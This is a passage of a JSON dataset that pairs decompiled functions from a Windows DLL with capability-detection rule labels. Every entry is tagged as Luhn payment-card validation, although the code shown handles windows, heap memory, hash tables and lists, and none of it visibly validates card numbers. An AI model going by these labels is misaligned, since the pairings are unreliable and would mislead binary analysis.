        "decompiled_code": "\nint64_t fcn.18002a538(int64_t arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    \n    iVar2 = fcn.18001bcac(arg1, arg2);\n    if (iVar2 == 0) {\n        iVar3 = fcn.18002a2d0(arg1, 0, 1);\n        iVar2 = iVar3;\n        if (iVar3 != arg1) {\n            do {\n                iVar1 = fcn.18001be00(iVar2);\n                if (iVar1 == arg2) {\n                    return iVar2;\n                }\n                iVar2 = fcn.18002a2d0(arg1, iVar2, 1);\n            } while ((iVar2 != 0) && (iVar2 != iVar3));\n        }\n        iVar2 = 0;\n    }\n    return iVar2;\n}\n",
        "token_count": 202
    },
    "18002a5b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18002a5bc(int64_t arg1, ulong arg2)\n\n{\n    uint8_t uVar1;\n    \n    if (*(arg1 + 0xa0) == 0) {\n        uVar1 = (*_sym.imp.USER32.dll_SendMessageW)(*(arg1 + 0x40), 0x87, 0, 0);\n        if ((uVar1 & (-(arg2 != 0) & 0x10U) + 0x10) != 0) {\n            (*_sym.imp.USER32.dll_SendMessageW)(*(arg1 + 0x40), 0xf4, arg2 != 0, 1);\n        }\n    }\n    else {\n        fcn.18001e06c(*(arg1 + 0xa0), arg2);\n    }\n    return;\n}\n",
        "token_count": 184
    },
    "18002a63": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18002a638(ulong arg1, int64_t arg2)\n\n{\n    uint32_t uVar1;\n    int64_t iVar2;\n    int64_t arg1_00;\n    \n    if ((arg2 == 0) || (uVar1 = (*_sym.imp.USER32.dll_GetWindowLongW)(*(arg2 + 0x40)),  (uVar1 >> 0x10 & 1) != 0)) {\n        iVar2 = fcn.18002a2d0(arg1, 0, 3);\n    }\n    else {\n        iVar2 = fcn.18002a254(arg1, arg2);\n    }\n    arg1_00 = iVar2;\n    if (iVar2 != 0) {\n        do {\n            fcn.18002a5bc(arg1_00, 0);\n            arg1_00 = fcn.18002a2d0(arg1, arg1_00, 0);\n            if (arg1_00 == 0) {\n                return;\n            }\n        } while (arg1_00 != iVar2);\n    }\n    return;\n}\n",
        "token_count": 247
    },
    "18002a70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18002a700(int64_t hWndParent, int64_t arg2, int64_t arg3)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int64_t iVar4;\n    \n    uVar2 = 0;\n    iVar1 = (*_sym.imp.USER32.dll_IsChild)(*(hWndParent + 0x40));\n    if (iVar1 == 0) {\n        return;\n    }\n    if (arg3 != 0) {\n        uVar2 = (*_sym.imp.USER32.dll_GetWindowLongW)(*(arg3 + 0x40));\n        if ((uVar2 >> 0x10 & 1) != 0) {\n            return;\n        }\n        uVar2 = fcn.18002a1c8(arg3);\n    }\n    if (arg2 == arg3) {\n        if ((uVar2 & 0x20) == 0) {\n            return;\n        }\n        if (arg2 == 0) goto code_r0x00018002a806;\n        uVar3 = fcn.18002a6c4(hWndParent);\n        iVar4 = fcn.18002a538(hWndParent, uVar3);\n        if (((iVar4 == 0) || (iVar4 == arg3)) || (uVar3 = fcn.18002a1c8(iVar4),  (uVar3 & 0x10) == 0))\n        goto code_r0x00018002a806;\ncode_r0x00018002a7cb:\n        fcn.18002a638(hWndParent, iVar4);\n    }\n    else {\n        iVar4 = arg3;\n        if (((arg2 != 0) && (iVar1 = fcn.18002a1c8(arg2),  iVar1 != 0)) || ((arg3 != 0 && (uVar2 != 0))))\n        goto code_r0x00018002a7cb;\n    }\n    if ((uVar2 & 0x30) == 0) {\n        uVar2 = fcn.18002a6c4(hWndParent);\n        arg3 = fcn.18002a538(hWndParent, uVar2);\n        uVar2 = fcn.18002a1c8(arg3);\n        if ((uVar2 & 0x20) == 0) {\n            return;\n        }\n        iVar1 = fcn.18001bea8(arg3);\n        if (iVar1 == 0) {\n            return;\n        }\n    }\ncode_r0x00018002a806:\n    fcn.18002a5bc(arg3, 1);\n    return;\n}\n",
        "token_count": 589
    },
    "18002a82": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t * fcn.18002a828(ulong arg1, int64_t arg2)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    int64_t *piVar3;\n    ulong *puVar4;\n    \n    iVar2 = fcn.180015b74(arg1);\n    if (iVar2 == 0) {\ncode_r0x00018002a874:\n        piVar3 = NULL;\n    }\n    else {\n        puVar4 = *(iVar2 + 0x88);\n        do {\n            if (puVar4 == NULL) goto code_r0x00018002a874;\n            if (puVar4 == NULL) {\n                fcn.180012514();\n                pcVar1 = swi(3);\n                piVar3 = (*pcVar1)();\n                return piVar3;\n            }\n            piVar3 = puVar4[2];\n            puVar4 = *puVar4;\n        } while (((piVar3[1] == 0) || (*(piVar3[1] + 0x48) != *(arg2 + 0x40))) && (*piVar3 != *(arg2 + 0x40)));\n    }\n    return piVar3;\n}\n",
        "token_count": 267
    },
    "18002a88": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t * fcn.18002a888(int64_t arg1, int64_t *arg2, ulong arg3)\n\n{\n    int64_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int64_t *piVar5;\n    ulong arg2_00;\n    int64_t iVar6;\n    int64_t iVar7;\n    int64_t **ppiVar8;\n    int64_t **ppiVar9;\n    int32_t iVar10;\n    \n    if (arg1 == 0) {\n        fcn.180012514();\n        pcVar2 = swi(3);\n        piVar5 = (*pcVar2)();\n        return piVar5;\n    }\n    iVar3 = 0;\n    piVar5 = arg2;\n    iVar10 = 0;\n    if (arg2 != NULL) {\n        if (arg2[1] == 0) {\n            iVar6 = *arg2;\n        }\n        else {\n            iVar6 = *(arg2[1] + 0x48);\n        }\n        iVar10 = iVar3;\n        if (iVar6 != 0) {\n            arg2_00 = fcn.180017c38(iVar6);\n            iVar6 = fcn.18002a254(arg1, arg2_00);\n            if (iVar6 != 0) {\n                piVar5 = fcn.18002a828(arg1, iVar6);\n            }\n        }\n    }\n    while (((piVar5 = fcn.18001c8c8(arg1, piVar5),  piVar5 != NULL && (iVar10 = iVar10 + 1,  piVar5 != arg2)) &&\n           (iVar10 < 0x3d))) {\n        if ((piVar5[1] != 0) && (iVar3 = fcn.18001e45c(piVar5[1], arg3),  iVar3 != 0)) {\n            return piVar5;\n        }\n    }\n    iVar6 = fcn.180015b74(arg1);\n    if (iVar6 != 0) {\n        ppiVar8 = *(iVar6 + 0x88);\n        if (arg2 == NULL) {\n            if (ppiVar8 == NULL) {\n                fcn.180012514();\n                pcVar2 = swi(3);\n                piVar5 = (*pcVar2)();\n                return piVar5;\n            }\n            piVar5 = ppiVar8[2];\n            ppiVar9 = *ppiVar8;\n            arg2 = piVar5;\n        }\n        else {\n            piVar5 = NULL;\n            if (ppiVar8 == NULL) {\n                return NULL;\n            }\n            do {\n                ppiVar9 = ppiVar8;\n                if (piVar5 == arg2) break;\n                if (ppiVar8 == NULL) {\n                    fcn.180012514();\n                    pcVar2 = swi(3);\n                    piVar5 = (*pcVar2)();\n                    return piVar5;\n                }\n                ppiVar9 = *ppiVar8;\n                piVar5 = ppiVar8[2];\n                ppiVar8 = ppiVar9;\n            } while (ppiVar9 != NULL);\n        }\n        if ((ppiVar9 != NULL) && (piVar1 = arg2,  piVar5 != NULL)) {\n            while (piVar1 != NULL) {\n                if (ppiVar9 == NULL) {\n                    ppiVar9 = *(iVar6 + 0x88);\n                }\n                if (ppiVar9 == NULL) {\n                    fcn.180012514();\n                    pcVar2 = swi(3);\n                    piVar5 = (*pcVar2)();\n                    return piVar5;\n                }\n                piVar5 = ppiVar9[2];\n                ppiVar9 = *ppiVar9;\n                if ((piVar5[1] != 0) && (iVar10 = fcn.18001e45c(piVar5[1], arg3),  iVar10 != 0)) {\n                    piVar1 = piVar5[1];\n                    if (piVar1 == NULL) {\n                        iVar7 = *piVar5;\n                    }\n                    else {\n                        iVar7 = piVar1[9];\n                    }\n                    if (iVar7 == 0) {\n                        if (piVar1 == NULL) {\n                            fcn.180012514();\n                            pcVar2 = swi(3);\n                            piVar5 = (*pcVar2)();\n                            return piVar5;\n                        }\n                        uVar4 = (**(*piVar1 + 0xf0))(piVar1);\n                        if ((uVar4 >> 0x1b & 1) == 0) {\n                            return piVar5;\n                        }\n                    }\n                    else {\n                        iVar10 = (*_sym.imp.USER32.dll_IsWindowEnabled)();\n                        if (iVar10 != 0) {\n                            return piVar5;\n                        }\n                    }\n                }\n                piVar1 = piVar5 - arg2;\n            }\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 1102
    },
    "18002b90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong * fcn.18002b904(int64_t arg1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    ulong *puVar3;\n    int64_t iVar4;\n    ulong in_RDX;\n    \n    if (arg1 == 0) {\n        fcn.180012514();\n        pcVar1 = swi(3);\n        puVar3 = (*pcVar1)();\n        return puVar3;\n    }\n    iVar4 = fcn.180014058();\n    fcn.18001ca7c(0, in_RDX);\n    puVar3 = *(iVar4 + 0x30);\n    while( true ) {\n        if (puVar3 == NULL) {\n            int.18001cb10(0);\n            return NULL;\n        }\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(arg1, *puVar3);\n        if (iVar2 == 0) break;\n        puVar3 = puVar3[4];\n    }\n    int.18001cb10(0);\n    return puVar3;\n}\n",
        "token_count": 236
    },
    "18003346": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.18003346c(uint64_t arg1)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    uint *puVar3;\n    uint64_t uVar4;\n    \n    if (arg1 < 0xffffffffffffffe1) {\n        uVar4 = 1;\n        if (arg1 != 0) {\n            uVar4 = arg1;\n        }\n        do {\n            if (*0x18006daa0 == 0) {\n                fcn.180038d44();\n                fcn.180038b1c(0x1e);\n                fcn.1800356b4(0xff);\n            }\n            iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x18006daa0, 0, uVar4);\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            if (*0x18006ddd0 == 0) {\n                puVar3 = fcn.180035b28();\n                *puVar3 = 0xc;\n                break;\n            }\n            iVar1 = fcn.180038d90(arg1);\n        } while (iVar1 != 0);\n        puVar3 = fcn.180035b28();\n        *puVar3 = 0xc;\n    }\n    else {\n        fcn.180038d90(arg1);\n        puVar3 = fcn.180035b28();\n        *puVar3 = 0xc;\n        iVar2 = 0;\n    }\n    return iVar2;\n}\n",
        "token_count": 338
    },
    "1800342b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.1800342b8(int64_t arg1, uint64_t arg2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int64_t iVar4;\n    uint *puVar5;\n    \n    if (arg1 == 0) {\n        iVar4 = fcn.18003346c(arg2);\n    }\n    else {\n        if (arg2 == 0) {\n            fcn.18003342c(arg1);\n        }\n        else {\n            if (arg2 < 0xffffffffffffffe1) {\n                do {\n                    if (arg2 == 0) {\n                        arg2 = 1;\n                    }\n                    iVar4 = (*_sym.imp.KERNEL32.dll_HeapReAlloc)(*0x18006daa0, 0, arg1, arg2);\n                    if (iVar4 != 0) {\n                        return iVar4;\n                    }\n                    if (*0x18006ddd0 == 0) {\n                        puVar5 = fcn.180035b28();\n                        uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                        uVar3 = fcn.180035ae0(uVar2);\n                        *puVar5 = uVar3;\n                        return 0;\n                    }\n                    iVar1 = fcn.180038d90(arg2);\n                    if (iVar1 == 0) {\n                        puVar5 = fcn.180035b28();\n                        uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                        uVar3 = fcn.180035ae0(uVar2);\n                        *puVar5 = uVar3;\n                        goto code_r0x000180034344;\n                    }\n                } while (arg2 < 0xffffffffffffffe1);\n            }\n            fcn.180038d90(arg2);\n            puVar5 = fcn.180035b28();\n            *puVar5 = 0xc;\n        }\ncode_r0x000180034344:\n        iVar4 = 0;\n    }\n    return iVar4;\n}\n",
        "token_count": 447
    },
    "18002c63": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18002c630(void)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.1800140a8();\n    *(iVar1 + 0x20) = *(iVar1 + 0x20) + 1;\n    return;\n}\n",
        "token_count": 61
    },
    "18002ca5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * fcn.18002ca5c(int64_t arg1)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    \n    piVar2 = arg1 + 0x1a;\n    if (*(arg1 + 2) != -1) {\n        piVar2 = arg1 + 0x12;\n    }\n    if (*piVar2 == -1) {\n        piVar2 = piVar2 + 2;\n    }\n    else {\n        do {\n            iVar1 = *piVar2;\n            piVar2 = piVar2 + 1;\n        } while (iVar1 != 0);\n    }\n    if (*piVar2 == -1) {\n        piVar2 = piVar2 + 2;\n    }\n    else {\n        do {\n            iVar1 = *piVar2;\n            piVar2 = piVar2 + 1;\n        } while (iVar1 != 0);\n    }\n    do {\n        iVar1 = *piVar2;\n        piVar2 = piVar2 + 1;\n    } while (iVar1 != 0);\n    return piVar2;\n}\n",
        "token_count": 249
    },
    "18002cf4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong * fcn.18002cf40(ulong *arg1, int64_t arg2)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    ulong *puVar4;\n    \n    if (arg2 == 0) {\n        *arg1 = 0;\n        *(arg1 + 1) = 0;\n        *(arg1 + 0xc) = 0;\n    }\n    else {\n        uVar2 = fcn.18002cab4(arg2);\n        iVar3 = fcn.18002cbc0(arg1, arg2, uVar2);\n        if (iVar3 == 0) {\n            fcn.1800124cc();\n            pcVar1 = swi(3);\n            puVar4 = (*pcVar1)();\n            return puVar4;\n        }\n    }\n    return arg1;\n}\n",
        "token_count": 192
    },
    "18002cf8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18002cf8c(uint32_t *arg1, ulong arg2, ushort *arg3)\n\n{\n    uint32_t uVar1;\n    ushort *puVar2;\n    ulong uVar3;\n    int32_t iVar4;\n    int64_t arg1_00;\n    int16_t iVar5;\n    \n    iVar5 = -1;\n    if (*(arg1 + 2) == -1) {\n        uVar1 = arg1[3];\n    }\n    else {\n        uVar1 = *arg1;\n    }\n    if ((uVar1 & 0x40) == 0) {\n        uVar3 = 0;\n    }\n    else {\n        puVar2 = fcn.18002ca5c(arg1);\n        *arg3 = *puVar2;\n        iVar4 = 1;\n        if (*(arg1 + 2) == iVar5) {\n            iVar4 = 3;\n        }\n        arg1_00 = puVar2 + iVar4 * 2;\n        if (arg1_00 == 0) {\n            uVar1 = 0;\n        }\n        else {\n            uVar1 = fcn.180033b84(arg1_00);\n        }\n        fcn.180008dfc(arg2, arg1_00, uVar1);\n        uVar3 = 1;\n    }\n    return uVar3;\n}\n",
        "token_count": 302
    },
    "18002d01": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18002d01c(int64_t arg1, ulong arg2, ulong arg3)\n\n{\n    ulong uVar1;\n    uint64_t uVar2;\n    \n    uVar2 = arg2;\n    if (arg2 == 0) {\n        uVar2 = 0x11;\n    }\n    if (*(arg1 + 8) != 0) {\n        fcn.1800096a4(*(arg1 + 8));\n        *(arg1 + 8) = 0;\n    }\n    if (arg3 != 0) {\n        uVar1 = SUB168(ZEXT816(8) * ZEXT816(uVar2), 0);\n        if (SUB168(ZEXT816(8) * ZEXT816(uVar2) >> 0x40, 0) != 0) {\n            uVar1 = 0xffffffffffffffff;\n        }\n        uVar1 = fcn.180009660(uVar1);\n        *(arg1 + 8) = uVar1;\n        fcn.180033c90(uVar1, 0, uVar2 << 3);\n    }\n    *(arg1 + 0x10) = uVar2;\n    return;\n}\n",
        "token_count": 264
    },
    "18002d09": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18002d09c(int64_t arg1)\n\n{\n    if (*(arg1 + 8) != 0) {\n        fcn.1800096a4(*(arg1 + 8));\n        *(arg1 + 8) = 0;\n    }\n    *(arg1 + 0x18) = 0;\n    *(arg1 + 0x20) = 0;\n    fcn.18002a100(*(arg1 + 0x28));\n    *(arg1 + 0x28) = 0;\n    return;\n}\n",
        "token_count": 124
    },
    "18002d11": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18002d110(int64_t arg1, uint64_t arg2)\n\n{\n    code *pcVar1;\n    ulong uVar2;\n    ulong *puVar3;\n    \n    if (arg1 == 0) {\n        fcn.180012514();\n        pcVar1 = swi(3);\n        uVar2 = (*pcVar1)();\n        return uVar2;\n    }\n    if (*(arg1 + 8) != 0) {\n        for (puVar3 = *(*(arg1 + 8) + ((arg2 >> 4 & 0xffffffff) % *(arg1 + 0x10)) * 8); puVar3 != NULL; puVar3 = *puVar3\n            ) {\n            if (puVar3[1] == arg2) {\n                return puVar3[2];\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 196
    },
    "18002d15": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.18002d158(ulong arg1, ulong arg2, ulong *arg3)\n\n{\n    int64_t iVar1;\n    uchar auStackX32 [8];\n    uchar auStack24 [24];\n    \n    iVar1 = fcn.18002d0d8(arg1, arg2, auStack24, auStackX32);\n    if (iVar1 != 0) {\n        *arg3 = *(iVar1 + 0x10);\n        iVar1 = 1;\n    }\n    return iVar1;\n}\n",
        "token_count": 118
    },
    "18002d18": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18002d184(int64_t arg1, uint64_t arg2)\n\n{\n    int64_t *piVar1;\n    ulong *puVar2;\n    ulong *puVar3;\n    ulong *puVar4;\n    \n    if (*(arg1 + 8) != 0) {\n        puVar4 = *(arg1 + 8) + ((arg2 >> 4 & 0xffffffff) % *(arg1 + 0x10)) * 8;\n        puVar2 = *puVar4;\n        while (puVar3 = puVar2,  puVar3 != NULL) {\n            if (puVar3[1] == arg2) {\n                *puVar4 = *puVar3;\n                *puVar3 = *(arg1 + 0x20);\n                piVar1 = arg1 + 0x18;\n                *piVar1 = *piVar1 + -1;\n                *(arg1 + 0x20) = puVar3;\n                if (*piVar1 == 0) {\n                    fcn.18002d09c(arg1);\n                }\n                return 1;\n            }\n            puVar4 = puVar3;\n            puVar2 = *puVar3;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 277
    },
    "18002d1e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18002d1ec(int64_t arg1, int64_t **arg2, int64_t *arg3, int64_t *arg4)\n\n{\n    code *pcVar1;\n    int64_t **ppiVar2;\n    int64_t *piVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int64_t *piVar6;\n    \n    piVar6 = *arg2;\n    if (piVar6 != NULL) {\n        if ((piVar6 == 0xffffffffffffffff) && (uVar5 = 0,  *(arg1 + 0x10) != 0)) {\n            ppiVar2 = *(arg1 + 8);\n            while (piVar6 = *ppiVar2,  piVar6 == NULL) {\n                uVar5 = uVar5 + 1;\n                ppiVar2 = ppiVar2 + 1;\n                if (*(arg1 + 0x10) <= uVar5) {\n                    fcn.180012514();\n                    pcVar1 = swi(3);\n                    (*pcVar1)();\n                    return;\n                }\n            }\n        }\n        piVar3 = *piVar6;\n        if (piVar3 == NULL) {\n            uVar5 = *(arg1 + 0x10);\n            uVar4 = (piVar6[1] >> 4 & 0xffffffff) % uVar5 + 1;\n            if (uVar4 < uVar5) {\n                ppiVar2 = *(arg1 + 8) + uVar4 * 8;\n                do {\n                    piVar3 = *ppiVar2;\n                    if (piVar3 != NULL) break;\n                    uVar4 = uVar4 + 1;\n                    ppiVar2 = ppiVar2 + 1;\n                } while (uVar4 < uVar5);\n            }\n        }\n        *arg2 = piVar3;\n        *arg3 = piVar6[1];\n        *arg4 = piVar6[2];\n    }\n    return;\n}\n",
        "token_count": 451
    },
    "18002d5b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18002d5b8(int64_t arg1, ulong *arg2)\n\n{\n    int64_t *piVar1;\n    code *pcVar2;\n    \n    if (arg2 == NULL) {\n        fcn.180012514();\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    *arg2 = *(arg1 + 0x20);\n    piVar1 = arg1 + 0x18;\n    *piVar1 = *piVar1 + -1;\n    *(arg1 + 0x20) = arg2;\n    if (*piVar1 == 0) {\n        fcn.18002d584(arg1);\n    }\n    return;\n}\n",
        "token_count": 161
    },
    "18002d5e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.18002d5e4(int64_t arg1)\n\n{\n    int64_t *arg2;\n    int64_t iVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    \n    if (arg1 == 0) {\n        fcn.180012514();\n        pcVar2 = swi(3);\n        iVar3 = (*pcVar2)();\n        return iVar3;\n    }\n    arg2 = *(arg1 + 8);\n    if (arg2 == NULL) {\n        fcn.180012514();\n        pcVar2 = swi(3);\n        iVar3 = (*pcVar2)();\n        return iVar3;\n    }\n    iVar3 = *arg2;\n    iVar1 = arg2[2];\n    *(arg1 + 8) = iVar3;\n    if (iVar3 == 0) {\n        *(arg1 + 0x10) = 0;\n    }\n    else {\n        *(iVar3 + 8) = 0;\n    }\n    fcn.18002d5b8(arg1, arg2);\n    return iVar1;\n}\n",
        "token_count": 242
    },
    "18002d63": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18002d630(int64_t arg1, int64_t *arg2)\n\n{\n    int64_t *piVar1;\n    code *pcVar2;\n    \n    if (arg2 == NULL) {\n        fcn.180012514();\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    if (arg2 == *(arg1 + 8)) {\n        *(arg1 + 8) = *arg2;\n    }\n    else {\n        *arg2[1] = *arg2;\n    }\n    if (arg2 == *(arg1 + 0x10)) {\n        *(arg1 + 0x10) = arg2[1];\n    }\n    else {\n        *(*arg2 + 8) = arg2[1];\n    }\n    if (arg2 == NULL) {\n        fcn.180012514();\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    *arg2 = *(arg1 + 0x20);\n    piVar1 = arg1 + 0x18;\n    *piVar1 = *piVar1 + -1;\n    *(arg1 + 0x20) = arg2;\n    if (*piVar1 == 0) {\n        fcn.18002d584(arg1);\n    }\n    return;\n}\n",
        "token_count": 298
    },
    "18002d76": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18002d760(int64_t arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.18002d6dc(arg1, 0, *(arg1 + 8));\n    *(iVar1 + 0x10) = arg2;\n    if (*(arg1 + 8) == 0) {\n        *(arg1 + 0x10) = iVar1;\n    }\n    else {\n        *(*(arg1 + 8) + 8) = iVar1;\n    }\n    *(arg1 + 8) = iVar1;\n    return;\n}\n",
        "token_count": 135
    },
    "18002d7a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18002d7a4(int64_t arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.18002d6dc(arg1, *(arg1 + 0x10), 0);\n    *(iVar1 + 0x10) = arg2;\n    if (*(arg1 + 0x10) == NULL) {\n        *(arg1 + 8) = iVar1;\n    }\n    else {\n        **(arg1 + 0x10) = iVar1;\n    }\n    *(arg1 + 0x10) = iVar1;\n    return;\n}\n",
        "token_count": 138
    },
    "18002d7e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18002d7e8(int64_t arg1, int64_t arg2, ulong arg3)\n\n{\n    int64_t iVar1;\n    \n    if (arg2 == 0) {\n        fcn.18002d760(arg1, arg3);\n    }\n    else {\n        iVar1 = fcn.18002d6dc(arg1, *(arg2 + 8), arg2);\n        *(iVar1 + 0x10) = arg3;\n        if (*(arg2 + 8) == NULL) {\n            *(arg1 + 8) = iVar1;\n        }\n        else {\n            **(arg2 + 8) = iVar1;\n        }\n        *(arg2 + 8) = iVar1;\n    }\n    return;\n}\n",
        "token_count": 167
    },
    "18002d88": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18002d88c(int64_t arg1, uint64_t arg2, int64_t arg3)\n\n{\n    int64_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    ulong arg1_00;\n    int64_t iVar4;\n    int64_t iVar5;\n    uint64_t arg1_01;\n    \n    if (arg2 < 0) {\n        fcn.180012514();\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    if (-1 < arg3) {\n        *(arg1 + 0x20) = arg3;\n    }\n    iVar5 = *(arg1 + 8);\n    if (arg2 == 0) {\n        fcn.1800096a4(iVar5);\n        *(arg1 + 8) = 0;\n        *(arg1 + 0x18) = 0;\n        *(arg1 + 0x10) = 0;\n    }\n    else {\n        if (iVar5 == 0) {\n            if (0xffffffff < arg2) {\n                fcn.180012514();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            arg1_00 = fcn.180009660(arg2);\n            *(arg1 + 8) = arg1_00;\n            fcn.180033c90(arg1_00, 0, arg2);\n            *(arg1 + 0x18) = arg2;\n        }\n        else {\n            iVar1 = *(arg1 + 0x18);\n            if (iVar1 < arg2) {\n                iVar5 = *(arg1 + 0x20);\n                if (*(arg1 + 0x20) == 0) {\n                    iVar4 = *(arg1 + 0x10) + (*(arg1 + 0x10) >> 0x3f & 7) >> 3;\n                    if (((iVar4 < 4) || (iVar5 = 0x400,  iVar4 < 0x401)) && (iVar5 = iVar4,  iVar4 < 4)) {\n                        iVar5 = 4;\n                    }\n                }\n                arg1_01 = arg2;\n                if (arg2 < iVar5 + iVar1) {\n                    arg1_01 = iVar5 + iVar1;\n                }\n                if (arg1_01 < iVar1) {\n                    fcn.180012514();\n                    pcVar2 = swi(3);\n                    (*pcVar2)();\n                    return;\n                }\n                iVar5 = fcn.180009660(arg1_01);\n                iVar3 = fcn.180034220(iVar5, arg1_01, *(arg1 + 8), *(arg1 + 0x10));\n                if (iVar3 != 0) {\n                    if (iVar3 == 0xc) {\n                        fcn.1800124cc();\n                        pcVar2 = swi(3);\n                        (*pcVar2)();\n                        return;\n                    }\n                    if ((iVar3 == 0x16) || (iVar3 == 0x22)) {\n                        fcn.180012514();\n                        pcVar2 = swi(3);\n                        (*pcVar2)();\n                        return;\n                    }\n                    if (iVar3 != 0x50) {\n                        fcn.180012514();\n                        pcVar2 = swi(3);\n                        (*pcVar2)();\n                        return;\n                    }\n                }\n                fcn.180033c90(*(arg1 + 0x10) + iVar5, 0, arg2 - *(arg1 + 0x10));\n                fcn.1800096a4(*(arg1 + 8));\n                *(arg1 + 8) = iVar5;\n                *(arg1 + 0x18) = arg1_01;\n            }\n            else {\n                iVar1 = *(arg1 + 0x10);\n                if (iVar1 < arg2) {\n                    fcn.180033c90(iVar5 + iVar1, 0, arg2 - iVar1);\n                }\n            }\n        }\n        *(arg1 + 0x10) = arg2;\n    }\n    return;\n}\n",
        "token_count": 914
    },
    "18002dd4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
